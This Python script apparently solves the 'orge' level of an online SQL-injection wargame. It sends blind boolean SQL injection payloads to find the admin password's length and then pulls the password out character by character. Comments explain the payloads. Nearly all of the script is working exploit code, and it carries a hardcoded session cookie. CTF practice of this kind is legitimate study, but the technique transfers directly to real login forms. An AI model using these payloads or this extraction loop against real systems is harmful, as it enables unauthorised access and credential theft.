#!/usr/bin/python3
# -*- coding: utf-8 -*-

import requests
import re
from termcolor import colored
from bs4 import BeautifulSoup as bs
import sys, getopt
import urllib.parse

url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php"
parameter = 'pw'
cookie = dict(PHPSESSID='lqjdocrtrts7s5gl84ruvmc5aa')

# One pw is read, pw will be compared to the pw in the database.
# thoese two have to match.
# SUBSTRING(文字列値,取り出し開始位置,取り出し文字数)
# admin' or 1=1 and ascii(substring(pw,1,1)) > 97 -- -
# The first checks the first letter of pw is greater than 97 in ascci value 'a'
# admin' or 1=1 and ascii(substring(pw,1,1)) > 98 -- -
# The second does not return, meaning that it is less than 98 which is 97

# sqli = "admin' or 1=1 && ascii(substring(pw,1,1)) > 97 -- -"

common = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~'
estimated_password_length = 8 # or less 
passwd = '7b751ae'

# the first query id is set as guest, so need to add admin here
#   $query = "select id from prob_orge where id='guest' and pw='{$_GET[pw]}'"; 

#  && ascii(substring(pw,1,1)) < 255 -- -
# https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php?pw=%27%20||%20id=%200x61646d696e%20--%20-
# this shows hello admin but pw 

# as an answer, 
# select id from prob_orge where id='guest' and pw =
#' || id=0x61646d696e && pw='dfjskoa89352hiokl' -- -


for i in range(1,32):
    sql = ("' || id='admin' && length(pw)=%d#" % i)
    sql = urllib.parse.quote(sql)
    query_url = "%s?%s=%s" % (url,parameter,sql)
    print("[*]%s" % query_url)

    http_request=requests.get(query_url,cookies=cookie)
    res = bs(http_request.text,"html.parser")

    if "Hello admin" in res.text:
        print('password length: %d' % i)
        estimated_password_length = i
        break

for i in range(1, estimated_password_length+1):
    for j in common:
        sqli = ("' || id='admin' && ascii(substring(pw,%d,%d)) = %d -- -" % (i,i,ord(j)))
        sqli = urllib.parse.quote(sqli)

        query_url = "%s?%s=%s" % (url,parameter,sqli)
        print("[*]%s" % query_url)

        http_request=requests.get(query_url,cookies=cookie)
        res = bs(http_request.text,"html.parser")

        if "Hello admin" in res.text:
            passwd += j 
            print('password: %s' % passwd)
            break
            
        elif j in common[-1]:
            # the end of string that means the password is found
            print('password: %s' % passwd)
            exit(1)


#query : select id from prob_orge where id='guest' and pw='?pw=' || id='admin' && length(pw)=8#'